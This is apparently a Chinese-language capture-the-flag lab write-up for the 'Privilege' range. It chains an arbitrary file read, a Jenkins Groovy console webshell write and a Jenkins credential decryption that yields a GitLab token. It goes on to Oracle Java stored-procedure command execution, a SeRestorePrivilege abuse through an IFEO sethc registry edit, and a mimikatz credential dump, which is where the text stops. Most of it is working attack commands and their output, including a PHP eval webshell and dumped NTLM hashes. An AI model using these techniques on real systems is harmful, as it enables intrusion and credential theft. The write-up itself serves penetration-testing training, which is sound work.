---
title: "春秋云镜 Privilege Writeup"
date: 2023-08-18T11:14:23+08:00
lastmod: 2023-08-18T11:14:23+08:00
draft: false
author: "X1r0z"

tags: ['kerberos', 'windows', 'domain']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

春秋云镜 Privilege Writeup

<!--more-->

## flag01

fscan

```shell
$ fscan ./fscan_darwin_arm64 -h 39.99.154.91

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 39.99.154.91    is alive
[*] Icmp alive hosts len is: 1
39.99.154.91:80 open
39.99.154.91:3306 open
39.99.154.91:139 open
39.99.154.91:135 open
39.99.154.91:8080 open
[*] alive ports len is: 5
start vulscan
[*] NetInfo:
[*]39.99.154.91
   [->]XR-JENKINS
   [->]172.22.14.7
[*] WebTitle: http://39.99.154.91:8080  code:403 len:548    title:None
[*] WebTitle: http://39.99.154.91       code:200 len:54646  title:XR SHOP
已完成 5/5
[*] 扫描结束,耗时: 46.257888042s
```

8080 端口 Jenkins, 80 端口 WordPress

wpscan

```shell
$ wpscan --url http://39.99.154.91/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.24
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://39.99.154.91/ [39.99.154.91]
[+] Started: Thu Aug 17 14:31:15 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
 |  - X-Powered-By: PHP/7.4.3
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://39.99.154.91/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://39.99.154.91/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://39.99.154.91/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://39.99.154.91/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://39.99.154.91/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.2.2 identified (Outdated, released on 2023-05-20).
 | Found By: Rss Generator (Passive Detection)
 |  - http://39.99.154.91/feed/, <generator>https://wordpress.org/?v=6.2.2</generator>
 |  - http://39.99.154.91/comments/feed/, <generator>https://wordpress.org/?v=6.2.2</generator>

[+] WordPress theme in use: blossom-shop
 | Location: http://39.99.154.91/wp-content/themes/blossom-shop/
 | Last Updated: 2023-07-25T00:00:00.000Z
 | Readme: http://39.99.154.91/wp-content/themes/blossom-shop/readme.txt
 | [!] The version is out of date, the latest version is 1.1.5
 | Style URL: http://39.99.154.91/wp-content/themes/blossom-shop/style.css?ver=1.1.4
 | Style Name: Blossom Shop
 | Style URI: https://blossomthemes.com/wordpress-themes/blossom-shop/
 | Description: Blossom Shop is a clean, fast and feature-rich free WordPress theme to create online stores. It is p...
 | Author: Blossom Themes
 | Author URI: https://blossomthemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://39.99.154.91/wp-content/themes/blossom-shop/style.css?ver=1.1.4, Match: 'Version: 1.1.4'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] usc-e-shop
 | Location: http://39.99.154.91/wp-content/plugins/usc-e-shop/
 | Last Updated: 2023-08-07T04:56:00.000Z
 | [!] The version is out of date, the latest version is 2.8.20
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 2.8.18 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://39.99.154.91/wp-content/plugins/usc-e-shop/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <===============> (137 / 137) 100.00% Time: 00:00:06

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Aug 17 14:31:27 2023
[+] Requests Done: 172
[+] Cached Requests: 7
[+] Data Sent: 57.671 KB
[+] Data Received: 823.771 KB
[+] Memory used: 315.875 MB
[+] Elapsed time: 00:00:11
```

usc-e-shop readme.txt

```shell
=== Welcart e-Commerce ===
Contributors: Collne Inc., uscnanbu
Tags: Welcart, e-Commerce, shopping, cart, eShop, store, admin, calendar, manage, plugin, shortcode, widgets, membership
Requires at least: 5.5
Tested up to: 6.2
Requires PHP: 7.4 - 8.0
Stable tag: 2.8.18
License: GPLv2 or later
License URI: https://www.gnu.org/licenses/gpl-2.0.html

Welcart is a free e-commerce plugin for Wordpress with top market share in Japan.
......
```

版本比较新, 没有什么漏洞

然后扫了遍目录, 发现备份的源码

http://39.99.154.91/www.zip

![image-20230817144212617](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308171442650.png)

任意文件读取, 但是 emm 感觉这样有点? 倒不如整个旧版的 usc-e-shop 插件来读文件

phpinfo

![image-20230817144259435](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308171442467.png)

另外目标 3306 端口不允许外连, 所以只能够利用这个任意文件读取

根据题目描述读取 Jenkins 初始管理员密码

`http://39.99.154.91/tools/content-log.php?logfile=C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword`

结果为 `510235cf43f14e83b88a9f144199655b`, 然后登录

![image-20230817145501543](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308171455573.png)

有 GitLab API Token, 但是在这里直接看是看不到

![image-20230817145706779](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308171457807.png)

利用 Jenkins 的 Script Console 执行命令

![image-20230817150056931](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308171500955.png)

写 webshell 方便一点, 因为是 PHPStudy, 所以不用考虑权限不够的情况

```groovy
println "cmd.exe /c echo ^<?php eval(\$_REQUEST[1]);?^> > C:\\phpstudy_pro\\WWW\\1.php".execute().text
```

flag01

![image-20230817150429752](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308171504779.png)

当然直接利用上面的任意文件读取也能拿到 flag01

`http://39.99.154.91/tools/content-log.php?logfile=C:\Users\Administrator\flag\flag01.txt`

## flag02

内网信息

```shell
C:\phpstudy_pro\WWW> ipconfig
Windows IP 配置
以太网适配器 以太网:
   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::6463:5449:f5a8:4b1a%3
   IPv4 地址 . . . . . . . . . . . . : 172.22.14.7
   子网掩码  . . . . . . . . . . . . : 255.255.0.0
   默认网关. . . . . . . . . . . . . : 172.22.255.253
```

fscan

```shell
172.22.14.11:139 open
172.22.14.46:445 open
172.22.14.31:445 open
172.22.14.11:445 open
172.22.14.7:445 open
172.22.14.46:139 open
172.22.14.31:139 open
172.22.14.46:135 open
172.22.14.31:135 open
172.22.14.11:135 open
172.22.14.7:139 open
172.22.14.7:135 open
172.22.14.46:80 open
172.22.14.16:80 open
172.22.14.7:80 open
172.22.14.16:22 open
172.22.14.11:88 open
172.22.14.16:8060 open
172.22.14.7:8080 open
172.22.14.7:3306 open
172.22.14.31:1521 open
172.22.14.16:9094 open
[*] NetInfo:
[*]172.22.14.46
   [->]XR-0923
   [->]172.22.14.46
[*] NetInfo:
[*]172.22.14.31
   [->]XR-ORACLE
   [->]172.22.14.31
[*] NetInfo:
[*]172.22.14.11
   [->]XR-DC
   [->]172.22.14.11
[*] WebTitle: http://172.22.14.7:8080   code:403 len:548    title:None
[*] NetInfo:
[*]172.22.14.7
   [->]XR-JENKINS
   [->]172.22.14.7
[*] NetBios: 172.22.14.46    XIAORANG\XR-0923              
[*] NetBios: 172.22.14.31    WORKGROUP\XR-ORACLE           
[*] NetBios: 172.22.14.11    [+] DC:XIAORANG\XR-DC          
[*] WebTitle: http://172.22.14.16:8060  code:404 len:555    title:404 Not Found
[*] WebTitle: http://172.22.14.7        code:200 len:54603  title:XR SHOP
[*] WebTitle: http://172.22.14.46       code:200 len:703    title:IIS Windows Server
[*] WebTitle: http://172.22.14.16       code:302 len:99     title:None 跳转url: http://172.22.14.16/users/sign_in
[*] WebTitle: http://172.22.14.16/users/sign_in code:200 len:34961  title:Sign in · GitLab
[+] http://172.22.14.7/www.zip poc-yaml-backup-file
```

整理信息

```shell
172.22.14.11 XR-DC
172.22.14.46 80 XR-0923
172.22.14.31 1521 XR-ORACLE
172.22.14.16 80,22,9094 GitLab
172.22.14.7 XR-JENKINS 本机
```

172.22.14.16 GitLab

![image-20230817151804982](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308171518020.png)

参考文章: https://www.cnblogs.com/zpchcbd/p/17573272.html

Jenkins 凭证保存在  `C:/ProgramData/Jenkins/.jenkins/credentials.xml`

```xml
<?xml version='1.1' encoding='UTF-8'?>
<com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin="credentials@1214.v1de940103927">
  <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
    <entry>
      <com.cloudbees.plugins.credentials.domains.Domain>
        <specifications/>
      </com.cloudbees.plugins.credentials.domains.Domain>
      <java.util.concurrent.CopyOnWriteArrayList>
        <com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl plugin="gitlab-plugin@1.6.0">
          <scope>GLOBAL</scope>
          <id>9eca4a05-e058-4810-b952-bd6443e6d9a8</id>
          <description></description>
          <apiToken>{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}</apiToken>
        </com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl>
      </java.util.concurrent.CopyOnWriteArrayList>
    </entry>
  </domainCredentialsMap>
</com.cloudbees.plugins.credentials.SystemCredentialsProvider>
```

当然也可以直接在控制台执行 Groovy 拿到解密后的 api token

```groovy
com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().forEach{
  it.properties.each { prop, val ->
    println(prop + ' = "' + val + '"')
  }
  println("-----------------------")
}
```

result

```shell
class = "class com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl"
apiToken = "glpat-7kD_qLH2PiQv_ywB9hz2"
id = "9eca4a05-e058-4810-b952-bd6443e6d9a8"
descriptor = "com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl$DescriptorImpl@1de5804"
scope = "GLOBAL"
description = ""
-----------------------
```

后面需要通过 GitLab API 进行操作

列出 GitLab 项目

```shell
proxychains curl -H "Private-Token: glpat-7kD_qLH2PiQv_ywB9hz2" 'http://172.22.14.16/api/v4/projects?simple=true
```

output

```json
[{
        "id": 6,
        "description": null,
        "name": "Internal Secret",
        "name_with_namespace": "XRLAB / Internal Secret",
        "path": "internal-secret",
        "path_with_namespace": "xrlab/internal-secret",
        "created_at": "2022-12-25T08:30:12.362Z",
        "default_branch": "main",
        "tag_list": [],
        "topics": [],
        "ssh_url_to_repo": "git@gitlab.xiaorang.lab:xrlab/internal-secret.git",
        "http_url_to_repo": "http://gitlab.xiaorang.lab/xrlab/internal-secret.git",
        "web_url": "http://gitlab.xiaorang.lab/xrlab/internal-secret",
        "readme_url": null,
        "avatar_url": null,
        "forks_count": 0,
        "star_count": 0,
        "last_activity_at": "2022-12-25T08:30:12.362Z",
        "namespace": {
            "id": 8,
            "name": "XRLAB",
            "path": "xrlab",
            "kind": "group",
            "full_path": "xrlab",
            "parent_id": null,
            "avatar_url": null,
            "web_url": "http://gitlab.xiaorang.lab/groups/xrlab"
        }
    }, {
        "id": 4,
        "description": null,
        "name": "XRAdmin",
        "name_with_namespace": "XRLAB / XRAdmin",
        "path": "xradmin",
        "path_with_namespace": "xrlab/xradmin",
        "created_at": "2022-12-25T07:48:16.751Z",
        "default_branch": "main",
        "tag_list": [],
        "topics": [],
        "ssh_url_to_repo": "git@gitlab.xiaorang.lab:xrlab/xradmin.git",
        "http_url_to_repo": "http://gitlab.xiaorang.lab/xrlab/xradmin.git",
        "web_url": "http://gitlab.xiaorang.lab/xrlab/xradmin",
        "readme_url": "http://gitlab.xiaorang.lab/xrlab/xradmin/-/blob/main/README.md",
        "avatar_url": null,
        "forks_count": 0,
        "star_count": 0,
        "last_activity_at": "2023-05-30T10:27:31.762Z",
        "namespace": {
            "id": 8,
            "name": "XRLAB",
            "path": "xrlab",
            "kind": "group",
            "full_path": "xrlab",
            "parent_id": null,
            "avatar_url": null,
            "web_url": "http://gitlab.xiaorang.lab/groups/xrlab"
        }
    }, {
        "id": 3,
        "description": null,
        "name": "Awenode",
        "name_with_namespace": "XRLAB / Awenode",
        "path": "awenode",
        "path_with_namespace": "xrlab/awenode",
        "created_at": "2022-12-25T07:46:43.635Z",
        "default_branch": "master",
        "tag_list": [],
        "topics": [],
        "ssh_url_to_repo": "git@gitlab.xiaorang.lab:xrlab/awenode.git",
        "http_url_to_repo": "http://gitlab.xiaorang.lab/xrlab/awenode.git",
        "web_url": "http://gitlab.xiaorang.lab/xrlab/awenode",
        "readme_url": "http://gitlab.xiaorang.lab/xrlab/awenode/-/blob/master/README.md",
        "avatar_url": null,
        "forks_count": 0,
        "star_count": 0,
        "last_activity_at": "2022-12-25T07:46:43.635Z",
        "namespace": {
            "id": 8,
            "name": "XRLAB",
            "path": "xrlab",
            "kind": "group",
            "full_path": "xrlab",
            "parent_id": null,
            "avatar_url": null,
            "web_url": "http://gitlab.xiaorang.lab/groups/xrlab"
        }
    }, {
        "id": 2,
        "description": "Example GitBook site using GitLab Pages: https://pages.gitlab.io/gitbook",
        "name": "XRWiki",
        "name_with_namespace": "XRLAB / XRWiki",
        "path": "xrwiki",
        "path_with_namespace": "xrlab/xrwiki",
        "created_at": "2022-12-25T07:44:18.589Z",
        "default_branch": "master",
        "tag_list": [],
        "topics": [],
        "ssh_url_to_repo": "git@gitlab.xiaorang.lab:xrlab/xrwiki.git",
        "http_url_to_repo": "http://gitlab.xiaorang.lab/xrlab/xrwiki.git",
        "web_url": "http://gitlab.xiaorang.lab/xrlab/xrwiki",
        "readme_url": "http://gitlab.xiaorang.lab/xrlab/xrwiki/-/blob/master/README.md",
        "avatar_url": "http://gitlab.xiaorang.lab/uploads/-/system/project/avatar/2/gitbook.png",
        "forks_count": 0,
        "star_count": 0,
        "last_activity_at": "2022-12-25T07:44:18.589Z",
        "namespace": {
            "id": 8,
            "name": "XRLAB",
            "path": "xrlab",
            "kind": "group",
            "full_path": "xrlab",
            "parent_id": null,
            "avatar_url": null,
            "web_url": "http://gitlab.xiaorang.lab/groups/xrlab"
        }
    }, {
        "id": 1,
        "description": "This project is automatically generated and helps monitor this GitLab instance. [Learn more](/help/administration/monitoring/gitlab_self_monitoring_project/index).",
        "name": "Monitoring",
        "name_with_namespace": "GitLab Instance / Monitoring",
        "path": "Monitoring",
        "path_with_namespace": "gitlab-instance-23352f48/Monitoring",
        "created_at": "2022-12-25T07:18:20.914Z",
        "default_branch": "main",
        "tag_list": [],
        "topics": [],
        "ssh_url_to_repo": "git@gitlab.xiaorang.lab:gitlab-instance-23352f48/Monitoring.git",
        "http_url_to_repo": "http://gitlab.xiaorang.lab/gitlab-instance-23352f48/Monitoring.git",
        "web_url": "http://gitlab.xiaorang.lab/gitlab-instance-23352f48/Monitoring",
        "readme_url": null,
        "avatar_url": null,
        "forks_count": 0,
        "star_count": 0,
        "last_activity_at": "2022-12-25T07:18:20.914Z",
        "namespace": {
            "id": 2,
            "name": "GitLab Instance",
            "path": "gitlab-instance-23352f48",
            "kind": "group",
            "full_path": "gitlab-instance-23352f48",
            "parent* Connection #0 to host 172.22.14.16 left intact
            _id ":null,"
            avatar_url ":null,"
            web_url ":"
            http: //gitlab.xiaorang.lab/groups/gitlab-instance-23352f48"}}]
```

有这么几个

```
xrlab/internal-secret
xrlab/xradmin
xrlab/awenode
xrlab/xrwiki
gitlab-instance-23352f48/Monitoring
```

其实有用的只有前面两个, 后面都是 GitLab 自己的 examples

git clone

```shell
proxychains git clone http://oauth2:'glpat-7kD_qLH2PiQv_ywB9hz2'@172.22.14.16/xrlab/internal-secret.git
proxychains git clone http://oauth2:'glpat-7kD_qLH2PiQv_ywB9hz2'@172.22.14.16/xrlab/xradmin.git
```

internal-secret 项目中有 credentials.txt, 盲猜是域内用户信息, 可能需要走一遍爆破流程

![image-20230817154546300](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308171545340.png)

xradmin 项目是 Ruoyi, 其 application-druid.yml 配置文件泄露了 Oracle 数据库的连接信息

![image-20230817154903197](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308171549239.png)

那么思路就是 Navicat 连过去手动创建 java 函数执行命令, 注意这里不能用 MDUT (会报错)

然后角色记得选 SYSDBA, 其实 xradmin 有 DBA 权限, 只不过需要在登录的时候单独指定 (Oracle 特性)

刚开始踩了这个坑还在想怎么提权来着....

还有一个坑就是刚开始创建 java source, 创建函数, 执行命令之后会提示没有权限, 需要根据报错信息手动赋予相关权限

Oracle 版本

```
Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production
PL/SQL Release 11.2.0.1.0 - Production
CORE	11.2.0.1.0	Production
TNS for 64-bit Windows: Version 11.2.0.1.0 - Production
NLSRTL Version 11.2.0.1.0 - Production
```

赋权

```sql
begin dbms_java.grant_permission( 'XRADMIN', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'read,write,execute,delete');end;
begin dbms_java.grant_permission( 'XRADMIN', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');end;
begin dbms_java.grant_permission( 'XRADMIN', 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '' );end;
```

创建 java source

```sql
declare sql_command varchar2(32767);
begin sql_command := 'create or replace and compile java source named "Command"
as
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
public class Command {
    public static String exec(String cmd) throws Exception{
        Process process = Runtime.getRuntime().exec(cmd);
        InputStream input = process.getInputStream();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int n;
        byte[] buffer = new byte[1024];
        while ((n = input.read(buffer)) != -1) {
            baos.write(buffer);
        }
        return baos.toString();
    }
}';
execute immediate sql_command;
end;
```

创建函数

```sql
create or replace function exec(cmd varchar2) return varchar2 as language java name 'Command.exec(java.lang.String) return java.lang.String';
```

执行命令

```sql
select exec('whoami') from dual;
```

![image-20230817160849437](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308171608489.png)

flag02

```shell
   __ _                      _               (_)           _      
  / _` |   ___     ___    __| |     o O O    | |    ___   | |__   
  \__, |  / _ \   / _ \  / _` |    o        _/ |   / _ \  | '_ \  
  |___/   \___/   \___/  \__,_|   TS__[O]  |__/_   \___/  |_.__/  
_|"""""|_|"""""|_|"""""|_|"""""| {======|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-' 

flag02: [REDACTED]
```

## flag03

根据 credentials.txt 的信息原本想无脑爆破来着, 然后发现 Machine 那一列的各种名称, 其中就包含 `XR-0923`, 即 `172.22.14.46`

```shell
XR-0923 | zhangshuai | wSbEajHzZs
```

crackmapexec smb

![image-20230817162506715](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308171625790.png)

账户属于 Remote Desktop Users 和 Remote Management Users 组, 因此可以连接 rdp 和 winrm

![image-20230817164120723](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308171641787.png)

![image-20230817170345613](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308171703693.png)

但要注意使用 rdp 连接时默认 cmd 是不会显示 SeRestorePrivilege 特权的, 需要右键 `以管理员身份` 运行

但是用 evil-winrm 连过去就能直接看到相关的特权

这里暂时不太明白是什么情况 (?)

然后参考 [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)

利用 SeRestorePrivilege 特权无视现有 ACL **修改**文件/编辑注册表

IFEO 注入

```shell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"
```

我这里直接拒绝访问, 但是本地却能测试成功, 很怪

然后注意这里是**修改**文件, 不是创建也不是删除? 不然会提示拒绝访问

最后索性把 cmd 重命名为 sethc, 这样虽然 cmd 会报错, 但是并不影响使用

![image-20230817233649385](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308172336460.png)

flag03

![image-20230817234134521](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308172341598.png)

## flag04

mimikatz

```shell
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 3135247 (00000000:002fd70f)
Session           : RemoteInteractive from 3
User Name         : Administrator
Domain            : XR-0923
Logon Server      : XR-0923
Logon Time        : 2023/8/17 23:43:13
SID               : S-1-5-21-754105099-1176710061-2177073800-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : XR-0923
	 * NTLM     : e19ccf75ee54e06b06a5907af13cef42
	 * SHA1     : 9131834cf4378828626b1beccaa5dea2c46f9b63
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : XR-0923
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : XR-0923
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 3117812 (00000000:002f92f4)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2023/8/17 23:43:12
SID               : S-1-5-96-0-3
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : ca4b01dd584a3176ca01a347b55b9c2b
	 * SHA1     : 6ed78a686ad7c13f320588fd619a1aca8118f462
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 98 20 01 fe 1f c2 33 3f 53 11 db 36 54 b3 01 4d d9 df 6f c1 e6 8b dd 88 38 11 e9 b3 93 b9 85 41 e0 32 f3 0f 12 19 90 0e de 5b 00 0e a8 25 1c f3 da b8 21 a0 a7 ed ce 4d 01 75 f5 8e 9b e4 6e 30 0f 31 40 d3 6f fc a9 0e 6d c2 a4 1e 2f c4 36 70 87 8a 22 99 a9 7c b8 04 fd 30 fa 6c 71 38 ab d3 9f 1f 52 a0 c1 35 2d 0b 38 df 36 49 b1 68 ae 59 b2 c0 5d 74 81 30 b8 48 d6 2a 37 07 cd 1c b9 80 7a 2d 23 aa 29 f8 a1 ff e1 9c 8a bc 38 42 34 74 48 5b 20 e4 69 db 5d f2 98 af 7c 9d 28 e8 c4 20 d1 10 51 ec 86 4c f8 56 9f db e8 ee e4 21 56 37 75 4e ec 3c 88 b0 70 c3 30 dc 5a 44 29 b3 df 8a b7 53 f3 de 2e 9c ba 17 82 5d af 65 43 a9 ec 86 ea 7f c4 ba 06 47 ed 32 75 5e 22 69 b7 f5 fa cb 43 d5 ed 70 e3 9e 93 5d 09 a5 4b 45 70 51 7e 4a 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 652753 (00000000:0009f5d1)
Session           : RemoteInteractive from 2
User Name         : zhangshuai
Domain            : XR-0923
Logon Server      : XR-0923
Logon Time        : 2023/8/17 23:29:10
SID               : S-1-5-21-754105099-1176710061-2177073800-1001
	msv :	
	 [00000003] Primary
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * NTLM     : f97d5a4b44b11bc257a63c3f76f18a9a
	 * SHA1     : f6ff2714d556240436758527e190e329f05cd43d
	tspkg :	
	wdigest :	
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * Password : (null)
	kerberos :	
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 605396 (00000000:00093cd4)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/8/17 23:29:09
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : 8519c5a89b2cd4d679a5a36f26863e5d
	 * SHA1     : 42d8188bc30ff0880b838e368c6e5522b86f978d
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : &H!vqg]om0Iz5Pn1NUGod&R9o /!$EK.?jn06+[J*6oZ\A+H?c2;V\(AgGpKw*f0W\vdUf;QoJ/5#DRZDwR@W5U9Io8`;zE7L":Ay-SKpe#>5S?;IL'HarDD
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 605234 (00000000:00093c32)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/8/17 23:29:09
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : ca4b01dd584a3176ca01a347b55b9c2b
	 * SHA1     : 6ed78a686ad7c13f320588fd619a1aca8118f462
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 98 20 01 fe 1f c2 33 3f 53 11 db 36 54 b3 01 4d d9 df 6f c1 e6 8b dd 88 38 11 e9 b3 93 b9 85 41 e0 32 f3 0f 12 19 90 0e de 5b 00 0e a8 25 1c f3 da b8 21 a0 a7 ed ce 4d 01 75 f5 8e 9b e4 6e 30 0f 31 40 d3 6f fc a9 0e 6d c2 a4 1e 2f c4 36 70 87 8a 22 99 a9 7c b8 04 fd 30 fa 6c 71 38 ab d3 9f 1f 52 a0 c1 35 2d 0b 38 df 36 49 b1 68 ae 59 b2 c0 5d 74 81 30 b8 48 d6 2a 37 07 cd 1c b9 80 7a 2d 23 aa 29 f8 a1 ff e1 9c 8a bc 38 42 34 74 48 5b 20 e4 69 db 5d f2 98 af 7c 9d 28 e8 c4 20 d1 10 51 ec 86 4c f8 56 9f db e8 ee e4 21 56 37 75 4e ec 3c 88 b0 70 c3 30 dc 5a 44 29 b3 df 8a b7 53 f3 de 2e 9c ba 17 82 5d af 65 43 a9 ec 86 ea 7f c4 ba 06 47 ed 32 75 5e 22 69 b7 f5 fa cb 43 d5 ed 70 e3 9e 93 5d 09 a5 4b 45 70 51 7e 4a 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 604459 (00000000:0009392b)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2023/8/17 23:29:09
SID               : S-1-5-96-0-2
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : ca4b01dd584a3176ca01a347b55b9c2b
	 * SHA1     : 6ed78a686ad7c13f320588fd619a1aca8118f462
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
